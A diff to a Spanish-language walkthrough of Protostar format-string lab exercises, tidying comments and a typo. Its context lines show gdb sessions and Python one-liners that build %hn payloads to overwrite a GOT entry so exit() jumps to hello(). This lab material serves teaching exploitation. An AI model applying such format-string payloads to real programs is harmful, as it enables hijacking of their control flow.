@@ -354,7 +354,7 @@ El objetivo sería que en vez de que escriba el ld.so escribamos nosotros (y al 
 > **TROZO DE TABLA GOT "0x8049724"**: \[modo normal]->  nada -> ld.so -> dir_exit()  .......  \[exploit]-> dir_hello()
 
 ```console
-(gdb) x/x 0x8049724 -> Insutruciion de GOT, alberga la direccion de nuestra funcion (o sea es un puntero de funcion)
+(gdb) x/x 0x8049724 
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2 
 (gdb) x/2i 0x080483f2 -> No se ha ejecutado todavia, por eso salen las insutrcciones que llaman al ld.so.
 0x80483f2 <exit@plt+6>:	push   0x30
@@ -393,7 +393,7 @@ Vamos a escribir de dos en dos bytes, para ello la memoria es la original mas ot
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%4$hn%5$hn")' > /tmp/pattern
 user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
 (gdb) break * 0x0804850f
-(gdb) p &hello -> Nos imprimimos la direccion de hello por si se nos habia olvidado
+(gdb) p &hello 
 $16 = (void (*)(void)) 0x80484b4 <hello>
 (gdb) run < /tmp/pattern
 x/x 0x8049724
@@ -424,7 +424,7 @@ $1 = 21820
 target is 55445544 :(
 ```
 
-Nos hemos pasado de largo. Pero no ahy que asustarse, hay solución. Simplemente hay que modificar un poco la técnica.
+Nos hemos pasado de largo. Pero hay solución. Simplemente hay que modificar un poco la técnica.
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn%13$hn"' | ./format3 | tail -n1
